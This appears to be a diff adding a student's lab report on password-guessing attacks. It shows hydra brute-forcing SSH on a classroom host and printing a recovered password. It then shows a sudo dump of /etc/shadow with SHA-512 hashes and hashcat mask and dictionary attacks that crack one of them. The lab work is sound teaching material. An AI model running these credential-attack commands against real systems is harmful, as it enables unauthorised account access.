@@ -941,3 +941,159 @@ if __name__ == "__main__":
         table.add_row([name, average_time])
         print(f"{table}\n\n")
 ```
+
+## 5**. Laboratorijska vježba**
+
+20.12.2021
+
+## Zadatak
+
+Online and Offline Password Guessing Attacks
+
+## **Online Password Guessing**
+
+Open bash shell in WSL on your local Windows machine.
+
+### Install `nmap` application. In the bash shell execute the following commands.
+
+```jsx
+Nmap done: 16 IP addresses (12 hosts up) scanned in 17.62 seconds
+```
+
+### Pokrenut ssh - default port 22
+
+```
+student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ ssh curlin_marko@10.0.15.7
+```
+
+### Rezultat
+
+```
+The authenticity of host '10.0.15.7 (10.0.15.7)' can't be established.
+ECDSA key fingerprint is SHA256:u4rEaCKzOum3w9z1y+9B+DW/uDhp020DQXH4Sso12ns.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.0.15.7' (ECDSA) to the list of known hosts.
+curlin_marko@10.0.15.7's password:
+Permission denied, please try again.
+```
+
+### Install `hydra` application
+
+```
+student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ hydra -l curlin_marko -x 4:6:a 10.0.15.7 -V -t 1 ssh
+```
+
+### Get the dictionary from [http://a507-server.local:8080/](http://a507-server.local:8080/) as follows (please mind the **group ID**).
+
+```
+wget -r -nH -np --reject "index.html*" http://a507-server.local:8080/dictionary/g1/
+```
+
+### Finally, use `hydra` with the dictionary as shown below (IMPORTANT: use `dictionary_online.txt`).
+
+```
+student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ hydra -l curlin_marko -P dictionary/g2/dictionary_online.txt 10.0.15.7 -V -t
+4 ssh
+```
+
+```
+[STATUS] 64.00 tries/min, 64 tries in 00:01h, 808 to do in 00:13h, 4 active
+```
+
+### Rezultat
+
+```
+[22][ssh] host: 10.0.15.7   login: curlin_marko   password: meofth
+```
+
+```
+student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ ssh curlin_marko@10.0.15.7
+curlin_marko@10.0.15.7's password:
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-91-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+```
+
+## **Offline Password Guessing**
+
+### For this task, use `hashcat` tool. Install it on your local machine as follows.
+
+```
+sudo apt-get install hashcat
+
+# Test it
+hashcat
+```
+
+### Password hash
+
+```
+curlin_marko@host_curlin_marko:~$ groups
+curlin_marko sudo
+curlin_marko@host_curlin_marko:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+curlin_marko@host_curlin_marko:~$ sudo cat /etc/shadow
+[sudo] password for curlin_marko:
+root:*:18900:0:99999:7:::
+daemon:*:18900:0:99999:7:::
+bin:*:18900:0:99999:7:::
+sys:*:18900:0:99999:7:::
+sync:*:18900:0:99999:7:::
+games:*:18900:0:99999:7:::
+man:*:18900:0:99999:7:::
+lp:*:18900:0:99999:7:::
+mail:*:18900:0:99999:7:::
+news:*:18900:0:99999:7:::
+uucp:*:18900:0:99999:7:::
+proxy:*:18900:0:99999:7:::
+www-data:*:18900:0:99999:7:::
+backup:*:18900:0:99999:7:::
+list:*:18900:0:99999:7:::
+irc:*:18900:0:99999:7:::
+gnats:*:18900:0:99999:7:::
+nobody:*:18900:0:99999:7:::
+_apt:*:18900:0:99999:7:::
+systemd-network:*:18977:0:99999:7:::
+systemd-resolve:*:18977:0:99999:7:::
+messagebus:*:18977:0:99999:7:::
+sshd:*:18977:0:99999:7:::
+curlin_marko:$6$smeEaTSxv4DvWxRK$qUGhselUQN0XgDUTI2f23fOG711jdwzC8d8yJVYEZYRniaRvPbWu0/H4UgtfYGItizmxCgySco83VqwiLEJdZ.:18981:0:99999:7:::
+jean_doe:$6$ZTBxJWokFkTTfPr7$NmuV4F5AKw6UApBKzYJgJDSbdYBnzfGLQymSl2dA0ML6QdC.eLebfqrtcSYd7GgqbLAq6sLDdRIjDHlHxuYHd.:18981:0:99999:7:::
+john_doe:$6$T8b9s5tzpAAsmJjD$L89PROtJW1tpc4BD.SpN8mB4GQODlYu0Waaab0OkbHXUXlG9k5G.QC7U17cqubwYEoFlfRCtaUzHomGGBg6Pl0:18981:0:99999:7:::
+alice_cooper:$6$Wp6taMzmh19nNjYi$JFJYxL.sREmUabIkx8bbvVDEskj3EW0ZzaZkxoxdLBEBMseSMY.LmpqW3Xetdhg3.n9FysSG2ChJYByIh50vJ.:18981:0:99999:7:::
+john_deacon:$6$z/wAta7.2gI8sReV$VdkE/oSDa6Zp.b/Gwic9xcpxCevw7Hc.3aV8t3RB.seYtDhz63CDQqX5ascIBDc1vjJiPMhVtQPEO88U7u9s41:18981:0:99999:7:::
+freddie_mercury:$6$MSulKvrcvg0BY9Mc$70hwqUsWMGHruHKD3x3ROR3lsVI2nVdu5ZYU6tYjNCwsEi5Md/ZlU50vtIIsZ8CYPok5/5tKHacGhreMQbeDf1:18981:0:99999:7:::
+```
+
+### Save the password hash obtained in the previous task into a file. To make this step somewhat easier, open the present folder in Visual Studio Code by running the following command.
+
+```
+student@DESKTOP-7Q0BASR:/mnt/c/Users/A507$ code .
+```
+
+### Start offline guessing attack by executing the following command. As in the previous task you know the following about the password:
+
+```
+hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
+```
+
+### If the attack from the previous step is not feasible approach, try a dictionary-based guessing attack
+
+```
+hashcat --force -m 1800 -a 0 hash.txt dictionary/g2/dictionary_offline.txt --status --status-timer 10
+```
+
+### Rezultat
+
+```
+ragtou
+
+```
